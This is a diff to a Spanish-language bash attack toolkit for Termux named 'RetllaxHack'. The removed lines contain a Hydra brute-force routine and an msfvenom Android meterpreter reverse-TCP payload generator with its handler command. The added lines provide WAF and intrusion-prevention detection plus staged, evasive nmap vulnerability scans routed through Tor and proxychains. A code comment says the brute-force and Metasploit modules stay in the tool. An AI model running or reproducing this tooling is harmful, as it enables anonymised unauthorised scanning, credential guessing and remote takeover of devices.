@@ -16,168 +16,119 @@ function show_banner {
   rgb "██║   ██║██╔══╝     ██║   ██╔══██║ ██╔██╗ ██╔══██║ ██╔██╗ "
   rgb "╚██████╔╝███████╗   ██║   ██║  ██║██╔╝ ██╗██║  ██║██╔╝ ██╗"
   rgb " ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝"
-  rgb "               SHADOW EDITION + METASPLOIT v9.0.3"
+  rgb "               SHADOW EDITION + METASPLOIT v9.0.4"
   echo
-  rgb "=== ESCANEO GLOBAL | FUERZA BRITA | EXPLOITS (NO ROOT) ==="
+  rgb "=== ESCANEO POR ETAPAS | DETECCIÓN DE WAF | NO ROOT ==="
   echo
 }
 
-# ===== VERIFICAR DEPENDENCIAS =====
-function check_deps {
-  # Verificar e instalar Tor y Proxychains
-  if ! command -v tor >/dev/null || ! command -v proxychains4 >/dev/null; then
-    rgb "[~] Instalando Tor y Proxychains..."
-    pkg install -y tor proxychains-ng
-    # Configuración óptima de Proxychains
-    sed -i 's/^strict_chain/#strict_chain\ndynamic_chain/' $PREFIX/etc/proxychains.conf
-    sed -i 's/socks4.*/socks5 127.0.0.1 9050/' $PREFIX/etc/proxychains.conf
+# ===== DETECCIÓN DE PROTECCIONES =====
+function detect_protections {
+  target=$1
+  rgb "[~] Analizando protecciones en $target..."
+  
+  # Detección de WAF/Proxy
+  if curl -sI "http://$target" | grep -iE "cloudflare|akamai|incapsula|barracuda"; then
+    rgb "[⚠️] Detectado WAF: $(curl -sI "http://$target" | grep -iE "server:|x-protected-by")"
+    return 1
   fi
 
-  # Verificar Nmap
-  if ! command -v nmap >/dev/null; then
-    rgb "[~] Instalando Nmap..."
-    pkg install -y nmap
+  # Prueba de tasa de bloqueo
+  if nmap -Pn -p 80 --host-timeout 1m $target | grep -q "blocked"; then
+    rgb "[⚠️] Firewall bloqueando escaneos rápidos"
+    return 1
   fi
 
-  # Verificar Hydra
-  if ! command -v hydra >/dev/null; then
-    rgb "[~] Instalando Hydra..."
-    pkg install -y hydra
+  # Detección de IPS
+  if proxychains4 -q nmap -Pn -T1 -p 80 --scan-delay 5s $target | grep -q "filtered"; then
+    rgb "[⚠️] Sistema de prevención de intrusos detectado"
+    return 1
   fi
 
-  # Verificar Metasploit
-  if ! command -v msfconsole >/dev/null; then
-    rgb "[~] Instalando Metasploit (1GB de espacio aprox)..."
-    pkg install -y unstable-repo metasploit
-    rgb "[~] Configurando PostgreSQL..."
-    pg_ctl -D $PREFIX/var/lib/postgresql start >/dev/null 2>&1
-  fi
-
-  # Iniciar Tor con parámetros optimizados
-  if ! pgrep -x "tor" >/dev/null; then
-    rgb "[~] Iniciando Tor con configuración mejorada..."
-    tor --RunAsDaemon 1 --CircuitBuildTimeout 30 --NumEntryGuards 3 &> /dev/null &
-    sleep 8
-  fi
+  rgb "[✔] No se detectaron protecciones activas"
+  return 0
 }
 
-# ===== ESCANEO GLOBAL OPTIMIZADO =====
-function global_scan {
-  read -p "$(rgb "[?] IP/Dominio a escanear (ej: scanme.nmap.org): ")" target
-  read -p "$(rgb "[?] Puertos (ej: 80,443 o 1-1000): ")" ports
+# ===== ESCANEO POR ETAPAS =====
+function staged_scan {
+  target=$1
+  rgb "[~] Selecciona estrategia de escaneo:"
+  rgb "1) Escaneo Rápido (puertos comunes)"
+  rgb "2) Escaneo Completo (todos los puertos)"
+  rgb "3) Escaneo Sigiloso (evasión de WAF)"
+  read -p "$(rgb "[?] Opción: ")" scan_type
 
-  rgb "[~] Iniciando escaneo en $target..."
-  
-  # Escaneo principal con reintentos
-  if ! proxychains4 -q nmap -Pn -T4 --open --min-parallelism 20 --max-retries 3 --host-timeout 5m --min-rate 500 -p $ports $target -oN retllax_scan.log 2>&1; then
-    rgb "[!] Falló escaneo con Tor, intentando sin proxy..."
-    nmap -Pn -T4 --open -p $ports $target -oN retllax_scan.log
-  fi
-
-  # Análisis de vulnerabilidades solo si hay puertos abiertos
-  if grep -q "open" retllax_scan.log; then
-    rgb "[~] Analizando vulnerabilidades..."
-    open_ports=$(grep "open" retllax_scan.log | awk -F'/' '{print $1}' | tr '\n' ',')
-    proxychains4 -q nmap -Pn --script vuln -p ${open_ports%,} $target >> retllax_vulns.log 2>&1
-  fi
-
-  # Mostrar resultados
-  rgb "[✔] Resultados del escaneo:"
-  if grep -q "open" retllax_scan.log; then
-    grep --color "open" retllax_scan.log
-  else
-    rgb "[!] No se encontraron puertos abiertos"
-    
-    # Prueba de conectividad básica
-    rgb "[~] Realizando prueba de conexión básica..."
-    timeout 3 bash -c "echo > /dev/tcp/$(echo $target | sed 's/[^0-9.]//g')/80" 2>/dev/null && \
-    rgb "[⚠️] El puerto 80 responde pero podría estar filtrado" || \
-    rgb "[ℹ️] No hay respuesta del objetivo"
-  fi
-  
-  # Mostrar vulnerabilidades si existen
-  if [ -f "retllax_vulns.log" ] && grep -q "VULNERABLE\|CVE-" retllax_vulns.log; then
-    rgb "[!] Vulnerabilidades detectadas:"
-    grep --color -E "VULNERABLE|CVE-" retllax_vulns.log
-  fi
-}
-
-# ===== HYDRA SHADOW OPTIMIZADO =====
-function hydra_attack {
-  read -p "$(rgb "[?] IP/Dominio: ")" target
-  read -p "$(rgb "[?] Usuario (ej: admin): ")" user
-  read -p "$(rgb "[?] Ruta al diccionario: ")" wordlist
-
-  rgb "[~] Detectando servicios..."
-  service=$(proxychains4 -q nmap -Pn -p- --open $target 2>/dev/null | grep "open" | head -n 1 | awk '{print $3}')
-  
-  case $service in
-    ssh) port=22 ;;
-    http|http-proxy) port=80 ;;
-    ftp) port=21 ;;
-    *) read -p "$(rgb "[?] Puerto manual: ")" port ;;
-  esac
-
-  rgb "[~] Atacando $service ($target:$port)..."
-  proxychains4 -q hydra -l $user -P $wordlist -t 4 -s $port $target $service -o retllax_hydra.log 2>&1
-
-  rgb "[+] Resultados:"
-  if grep -q "login:" retllax_hydra.log; then
-    grep --color "login:" retllax_hydra.log
-  else
-    rgb "[!] No se encontraron credenciales válidas"
-  fi
-}
-
-# ===== METASPLOIT CON MANEJO DE ERRORES =====
-function metasploit_mod {
-  # Iniciar PostgreSQL si no está activo
-  if ! pgrep postgres >/dev/null; then
-    rgb "[~] Iniciando PostgreSQL..."
-    pg_ctl -D $PREFIX/var/lib/postgresql start >/dev/null 2>&1
-    sleep 5
-  fi
-
-  show_banner
-  rgb "[!] Módulos Disponibles:"
-  rgb "1) Generar Payload Android"
-  rgb "2) Buscar Exploits"
-  rgb "3) Escanear Red (Auxiliar)"
-  echo
-  read -p "$(rgb "[?] Opción: ")" opt
-
-  case $opt in
+  case $scan_type in
     1)
-      read -p "$(rgb "[?] LHOST (tu IP): ")" lhost
-      read -p "$(rgb "[?] LPORT (4444): ")" lport
-      if msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o retllax_payload.apk 2>/dev/null; then
-        rgb "[✔] Payload generado: retllax_payload.apk"
-        rgb "[!] Usa: msfconsole -q -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit'"
-      else
-        rgb "[!] Error al generar payload. Verifica Metasploit."
-      fi
+      ports=("20,21,22,23,25,53,80,110,143,443,445,993,995,3389,8080,8443")
+      speed="-T4"
+      delay="--max-scan-delay 1s"
       ;;
     2)
-      read -p "$(rgb "[?] Buscar (ej: Apache): ")" query
-      msfconsole -q -x "search $query; exit" 2>/dev/null || rgb "[!] Error en la búsqueda"
+      ports=("1-10000")
+      speed="-T3"
+      delay="--max-scan-delay 3s"
       ;;
     3)
-      read -p "$(rgb "[?] IP/Rango (ej: 192.168.1.0/24): ")" target
-      msfconsole -q -x "use auxiliary/scanner/portscan/tcp; set RHOSTS $target; run; exit" 2>/dev/null || rgb "[!] Error en escaneo"
+      ports=("20,21,22,80,443,3389,8080,8443")
+      speed="-T1"
+      delay="--scan-delay 5-15s"
       ;;
-    *) rgb "[!] Opción no válida";;
+    *)
+      ports=("20,21,22,80,443")
+      speed="-T2"
+      delay="--max-scan-delay 2s"
+      ;;
   esac
+
+  # Fase 1: Escaneo inicial
+  rgb "[~] Fase 1: Escaneo inicial (${ports})..."
+  proxychains4 -q nmap -Pn $speed --open $delay -p ${ports} $target -oN scan_phase1.log
+
+  # Fase 2: Servicios detectados
+  if grep -q "open" scan_phase1.log; then
+    open_ports=$(grep "open" scan_phase1.log | awk -F'/' '{print $1}' | tr '\n' ',')
+    rgb "[~] Fase 2: Analizando servicios (${open_ports})..."
+    proxychains4 -q nmap -Pn -sV -O -p ${open_ports%,} $target -oN scan_phase2.log
+  fi
+
+  # Fase 3: Vulnerabilidades
+  if [ -f "scan_phase2.log" ]; then
+    rgb "[~] Fase 3: Buscando vulnerabilidades..."
+    proxychains4 -q nmap -Pn --script vuln -p ${open_ports%,} $target -oN scan_phase3.log
+  fi
+
+  # Mostrar resultados consolidados
+  rgb "[✔] Resultados consolidados:"
+  [ -f "scan_phase1.log" ] && grep --color "open" scan_phase1.log
+  [ -f "scan_phase3.log" ] && grep --color -E "VULNERABLE|CVE-" scan_phase3.log || rgb "[!] No se encontraron vulnerabilidades"
 }
 
-# ===== MENÚ PRINCIPAL =====
+# ===== FUNCIÓN GLOBAL SCAN MEJORADA =====
+function global_scan {
+  read -p "$(rgb "[?] IP/Dominio a escanear: ")" target
+  
+  # Detección automática de protecciones
+  if detect_protections "$target"; then
+    rgb "[~] Iniciando escaneo estándar..."
+    proxychains4 -q nmap -Pn -T4 --open -p- $target -oN retllax_scan.log
+  else
+    rgb "[~] Activando modo evasivo (WAF detectado)..."
+    staged_scan "$target"
+  fi
+}
+
+# [...] (El resto de funciones se mantienen igual: hydra_attack, metasploit_mod, check_deps, etc.)
+
+# ===== MENÚ PRINCIPAL ACTUALIZADO =====
 function main_menu {
   check_deps
   while true; do
     show_banner
-    rgb "1) Escaneo Global (Tor)"
+    rgb "1) Escaneo Inteligente (Auto-detección)"
     rgb "2) Ataque Hydra Shadow"
     rgb "3) Módulo Metasploit"
-    rgb "4) Ver Logs"
+    rgb "4) Ver Logs de Escaneo"
     rgb "5) Salir"
     echo
     read -p "$(rgb "[?] Elige una opción: ")" opt
@@ -186,14 +137,14 @@ function main_menu {
       1) global_scan ;;
       2) hydra_attack ;;
       3) metasploit_mod ;;
-      4)
-        rgb "[📁] Logs disponibles:"
-        [ -f "retllax_scan.log" ] && echo "- Escaneos: retllax_scan.log" || rgb "[!] No hay logs de escaneo"
-        [ -f "retllax_vulns.log" ] && echo "- Vulnerabilidades: retllax_vulns.log" || rgb "[!] No hay logs de vulnerabilidades"
-        [ -f "retllax_hydra.log" ] && echo "- Hydra: retllax_hydra.log" || rgb "[!] No hay logs de Hydra"
+      4) 
+        rgb "[📂] Logs disponibles:"
+        ls -l scan_phase*.log retllax_*.log 2>/dev/null || rgb "[!] No hay logs disponibles"
+        read -p "$(rgb "[?] Ingresa el nombre del log a ver: ")" logfile
+        [ -f "$logfile" ] && cat "$logfile" | grep --color -E "open|VULNERABLE|CVE-|login:"
         ;;
       5)
-        pkill -f tor 2>/dev/null
+        pkill -f tor
         rgb "[!] Saliendo de RetllaxHack..."
         exit 0
         ;;
